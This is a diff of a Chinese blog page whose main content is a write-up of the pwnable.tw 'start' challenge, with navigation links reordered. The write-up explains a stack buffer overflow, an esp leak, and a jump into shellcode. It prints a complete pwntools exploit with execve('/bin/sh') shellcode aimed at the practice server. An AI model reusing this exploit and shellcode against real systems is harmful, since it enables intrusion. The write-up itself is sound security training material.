@@ -247,9 +247,9 @@
           
           
           <li>
-            <a href="/about/">
+            <a href="/categories/">
               
-              关于
+              分类
               
               
             </a>
@@ -258,9 +258,9 @@
           
           
           <li>
-            <a href="/archive/">
+            <a href="/about/">
               
-              归档
+              关于
               
               
             </a>
@@ -280,9 +280,9 @@
           
           
           <li>
-            <a href="/categories/">
+            <a href="/archive/">
               
-              分类
+              归档
               
               
             </a>
@@ -410,7 +410,7 @@
             </span>
             <div class="blank_box"></div>
             <span class="meta">
-              Words <span class="post-count">463</span> In Total
+              Words <span class="post-count">466</span> In Total
             </span>
             <div class="blank_box"></div>
             <!-- WordCount end -->
@@ -472,9 +472,27 @@
       <!-- Post Container -->
       <div class="col-lg-8 col-lg-offset-1 col-md-10 col-md-offset-1 post-container">
 
-        <p>现阶段就是复现难题的同时四处找题目刷，今天开始做pwnable.tw。结果这第一道名为start的题目就做了挺久的。</p>
-<h1 id="start"><a href="#start" class="headerlink" title="start"></a>start</h1><p><img src="start_4.png" alt="pic1"><br>和国内常见的起始题目完全不同的风格，程序通过很短的汇编实现了write、read<br>看着不像是用ROP的做法，保护全关了，这里考虑利用NX关闭，堆栈可执行实现shellcode<br>光看汇编比较抽象，自己画一下示意图<br><img src="start_3.png" alt="pic2"><br>这个是起始的栈示意图，注意到程序开头push了esp，并且后边实现了write，而且read的写入长度参数是0x3c，可以做到溢出覆盖返回地址。利用write将栈中的esp输出<br><img src="start_5.png" alt="pic3"><br>图右是第一次覆盖之后的，利用0x08048087这一段汇编输出esp<br><img src="start_1.png" alt="pic5"><br>这是泄露出来的esp<br><img src="start_6.png" alt="pic4"><br>再次覆盖后示意如图，执行到esp+14h就到了retn，就可以用我们自己的eip控制程序执行的ip，从而执行shellcode<br><img src="start_7.png" alt="pic6"><br>远程反应比较慢，而且目有点复杂，还需要自己翻一下才能找到flag。<br>这题使我感受到了比较专业的pwn学习网站的质量，做完觉得是比较简单的题，但是刚拿到手也是没有头绪的。<br>题目风格也是很二进制的，蛮不错的<br>pwnable.tw值得继续刷</p>
-<h1 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h1><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span>*</span><br><span class="line">context.log_level=<span class="string">&quot;debug&quot;</span></span><br><span class="line"><span class="comment">#p=process(&quot;./start&quot;)</span></span><br><span class="line">p=remote(<span class="string">&quot;chall.pwnable.tw&quot;</span>,<span class="string">&quot;10000&quot;</span>)</span><br><span class="line"></span><br><span class="line">payload=<span class="string">b&#x27;a&#x27;</span>*<span class="number">0x14</span>+p32(<span class="number">0x8048087</span>)</span><br><span class="line">p.send(payload)</span><br><span class="line">sleep(<span class="number">0.01</span>)</span><br><span class="line">p.recvuntil(<span class="string">b&quot;CTF:&quot;</span>)</span><br><span class="line">esp=u32(p.recv()[:<span class="number">4</span>])</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;esp = &quot;</span>,<span class="built_in">str</span>(<span class="built_in">hex</span>(esp)))</span><br><span class="line">eip=esp+<span class="number">0x14</span></span><br><span class="line">shellcode=asm(<span class="string">&#x27;\n&#x27;</span>.join([</span><br><span class="line">    <span class="string">&#x27;push %d&#x27;</span> % u32(<span class="string">&#x27;/sh\0&#x27;</span>),</span><br><span class="line">    <span class="string">&#x27;push %d&#x27;</span> % u32(<span class="string">&#x27;/bin&#x27;</span>),</span><br><span class="line">    <span class="string">&#x27;xor edx, edx&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;xor ecx, ecx&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;mov ebx, esp&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;mov eax, 0xb&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;int 0x80&#x27;</span>,</span><br><span class="line">]))</span><br><span class="line">payload=<span class="string">b&#x27;a&#x27;</span>*<span class="number">0x14</span>+p32(eip)+shellcode</span><br><span class="line"><span class="comment">#gdb.attach(p)</span></span><br><span class="line">p.send(payload)</span><br><span class="line">p.interactive()</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+        <p>现阶段就是复现难题的同时四处找题目刷，<a target="_blank" rel="noopener" href="http://xn--pwnable-b54k99ij93a6sb9w5a.tw">今天开始做pwnable.tw</a>。结果这第一道名为start的题目就做了挺久的。</p>
+<h1>start</h1>
+<p><img src="start_4.png" alt="pic1"><br>
+和国内常见的起始题目完全不同的风格，程序通过很短的汇编实现了write、read<br>
+看着不像是用ROP的做法，保护全关了，这里考虑利用NX关闭，堆栈可执行实现shellcode<br>
+光看汇编比较抽象，自己画一下示意图<br>
+<img src="start_3.png" alt="pic2"><br>
+这个是起始的栈示意图，注意到程序开头push了esp，并且后边实现了write，而且read的写入长度参数是0x3c，可以做到溢出覆盖返回地址。利用write将栈中的esp输出<br>
+<img src="start_5.png" alt="pic3"><br>
+图右是第一次覆盖之后的，利用0x08048087这一段汇编输出esp<br>
+<img src="start_1.png" alt="pic5"><br>
+这是泄露出来的esp<br>
+<img src="start_6.png" alt="pic4"><br>
+再次覆盖后示意如图，执行到esp+14h就到了retn，就可以用我们自己的eip控制程序执行的ip，从而执行shellcode<br>
+<img src="start_7.png" alt="pic6"><br>
+远程反应比较慢，而且目有点复杂，还需要自己翻一下才能找到flag。<br>
+这题使我感受到了比较专业的pwn学习网站的质量，做完觉得是比较简单的题，但是刚拿到手也是没有头绪的。<br>
+题目风格也是很二进制的，蛮不错的<br>
+pwnable.tw值得继续刷</p>
+<h1>exp</h1>
+<figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span>*</span><br><span class="line">context.log_level=<span class="string">&quot;debug&quot;</span></span><br><span class="line"><span class="comment">#p=process(&quot;./start&quot;)</span></span><br><span class="line">p=remote(<span class="string">&quot;chall.pwnable.tw&quot;</span>,<span class="string">&quot;10000&quot;</span>)</span><br><span class="line"></span><br><span class="line">payload=<span class="string">b&#x27;a&#x27;</span>*<span class="number">0x14</span>+p32(<span class="number">0x8048087</span>)</span><br><span class="line">p.send(payload)</span><br><span class="line">sleep(<span class="number">0.01</span>)</span><br><span class="line">p.recvuntil(<span class="string">b&quot;CTF:&quot;</span>)</span><br><span class="line">esp=u32(p.recv()[:<span class="number">4</span>])</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;esp = &quot;</span>,<span class="built_in">str</span>(<span class="built_in">hex</span>(esp)))</span><br><span class="line">eip=esp+<span class="number">0x14</span></span><br><span class="line">shellcode=asm(<span class="string">&#x27;\n&#x27;</span>.join([</span><br><span class="line">    <span class="string">&#x27;push %d&#x27;</span> % u32(<span class="string">&#x27;/sh\0&#x27;</span>),</span><br><span class="line">    <span class="string">&#x27;push %d&#x27;</span> % u32(<span class="string">&#x27;/bin&#x27;</span>),</span><br><span class="line">    <span class="string">&#x27;xor edx, edx&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;xor ecx, ecx&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;mov ebx, esp&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;mov eax, 0xb&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;int 0x80&#x27;</span>,</span><br><span class="line">]))</span><br><span class="line">payload=<span class="string">b&#x27;a&#x27;</span>*<span class="number">0x14</span>+p32(eip)+shellcode</span><br><span class="line"><span class="comment">#gdb.attach(p)</span></span><br><span class="line">p.send(payload)</span><br><span class="line">p.interactive()</span><br><span class="line"></span><br></pre></td></tr></table></figure>
 
         <hr>
         <!-- Pager -->
@@ -623,7 +641,7 @@
         <div id="toc" class="toc-article">
         <strong class="toc-title">目录</strong>
         
-          <ol class="toc-nav"><li class="toc-nav-item toc-nav-level-1"><a class="toc-nav-link" href="#start"><span class="toc-nav-number">1.</span> <span class="toc-nav-text">start</span></a></li><li class="toc-nav-item toc-nav-level-1"><a class="toc-nav-link" href="#exp"><span class="toc-nav-number">2.</span> <span class="toc-nav-text">exp</span></a></li></ol>
+          <ol class="toc-nav"><li class="toc-nav-item toc-nav-level-1"><a class="toc-nav-link"><span class="toc-nav-number">1.</span> <span class="toc-nav-text">start</span></a></li><li class="toc-nav-item toc-nav-level-1"><a class="toc-nav-link"><span class="toc-nav-number">2.</span> <span class="toc-nav-text">exp</span></a></li></ol>
         
         </div>
       </aside>
